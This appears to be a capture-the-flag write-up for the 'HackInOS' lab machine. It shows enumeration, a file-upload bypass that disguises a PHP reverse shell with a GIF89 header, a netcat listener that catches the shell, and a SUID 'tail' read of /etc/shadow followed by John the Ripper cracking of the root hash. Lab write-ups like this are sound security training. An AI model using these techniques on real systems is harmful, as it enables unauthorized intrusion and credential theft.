root@kali ~/D/C/HACKINOS# nmap -sS -A -T4 -p- 10.0.0.31

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d9:c1:5c:20:9a:77:54:f8:a3:41:18:92:1b:1e:e5:35 (RSA)
|   256 df:d4:f2:61:89:61:ac:e0:ee:3b:5d:07:0d:3f:0c:87 (ECDSA)
|_  256 8b:e4:45:ab:af:c8:0e:7e:2a:e4:47:e7:52:f9:bc:71 (ED25519)
8000/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-generator: WordPress 5.0.3
| http-robots.txt: 2 disallowed entries 
|_/upload.php /uploads
|_http-title: Blog &#8211; Just another WordPress site
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache/2.4.25 (Debian)

Starting with a NMAP scan we see 2 open ports, SSH and HTTP, let's start by enumerating HTTP and try to get creditnals to log to the machine with ssh.

root@kali ~/D/C/HACKINOS# dirsearch -u http://10.0.0.31:8000

We find a robots.txt file.

User-agent:*
Disallow:/upload.php
Disallow:/uploads

Going to 10.0.0.31/upload.php there is an option to upload images. By using the dev tools we can find a little hint:

<!-- https://github.com/fatihhcelik/Vulnerable-Machine---Hint -->

Going to https://github.com/fatihhcelik/Vulnerable-Machine---Hint we can see the source code for the upload.php page. The program checks if the image is not empty, if it is not empty, it hashes the name of the file and adds a random number to it.
The program checks if the MIME(MIME stands for "Multipurpose Internet Mail Extensions. It's a way of identifying files on the Internet according to their nature and format.) type of the image is either "image/png" or "image/gif".

This means if we enter either a gif or a png we the name of the file will be hashed and saved to the /uploads folder. The goal is to upload a php reverse shell and connent to the machine, we need to fool the program that our php code is an image or a gif. After playing with a few jpeg images I found that the MIME type is stored in thier metadata and can be viewed by using "exiftool", I searched for ways to change the MIME type but I did not succeed. I tried using Burpsuite to capture the packet being uploaded and maybe change it a bit. I uploaded a png file and intercpet the packet, I saw the on the top of the source code was "PNG", I uploaded a gif image aswell and there was the same thing only with "GIF89". I tried uploading the reverse shell and adding "PNG" to it but it didn't work, but after adding "GIF89" it worked and the script name was hashed and added to the /uploads directory. Now we need to find our uploaded script and access it, since a random number from 1-100 is added in the end we'll make a python script that covers all options.

createHashesList.py - 
{
	import hashlib
	
	nameOfFile = "reverse_shell.php"
	for i in range(1,100):
	        hashedFileName = hashlib.md5((nameOfFile+str(i)).encode()).hexdigest()
        print(hashedFileName+".php")
}

We can now use gobuster to see if our file is there.

root@kali ~/D/C/HACKINOS# gobuster dir -u http://10.0.0.31:8000/uploads -w ./list.txt

/8d83eaa129ac84575c92ec4491547275.php (Status: 200) [Size: 287]

We can set up a listener on our local machine and go to the script.

root@kali ~# nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.0.0.27] from (UNKNOWN) [10.0.0.31] 51738
Linux 1afdd1f6b82c 4.15.0-29-generic #31~16.04.1-Ubuntu SMP Wed Jul 18 08:54:04 UTC 2018 x86_64 GNU/Linux
 20:25:05 up 1 day,  2:30,  0 users,  load average: 0.08, 0.05, 0.01
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data

We now have access to the machine as the www-data user.
Reading the /etc/passwd file we find there is only the root user. Let's try to find SUID files.

$ find / -perm /4000 2> /dev/null

We find that the tail command has SUID permissions, at first I thought of editing the code of the tail command to open a shell, but I remebred we are the www-data user and we don't permission to do that. Since the tail user has SUID permissions we can read files with root only root permissions, such as the /etc/shadow file that holds hashed passwords for the machine users. 

$ tail -n 20 /etc/shadow | grep root
root:$6$qoj6/JJi$FQe/BZlfZV9VX8m0i25Suih5vi1S//OVNpd.PvEVYcL1bWSrF3XTVTF91n60yUuUMUcP65EgT8HfjLyjGHova/:17951:0:99999:7:::
$ 

We can add the hashed password to a file and crack it on our local machine using John The Ripper.

root@kali ~/D/C/HACKINOS# echo 'root:$6$qoj6/JJi$FQe/BZlfZV9VX8m0i25Suih5vi1S//OVNpd.PvEVYcL1bWSrF3XTVTF91n60yUuUMUcP65EgT8HfjLyjGHova/' > rootHashedPassword.txt
root@kali ~/D/C/HACKINOS# john rootHashedPassword.txt 

john             (root)     

We can log in from ssh as root but we can also use the "su" command, before we can use the command we need to get a better shell using python.

$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@1afdd1f6b82c:/home$ su root
su root
Password: john

root@1afdd1f6b82c:/home# cat /root/flag
cat /root/flag
Life consists of details..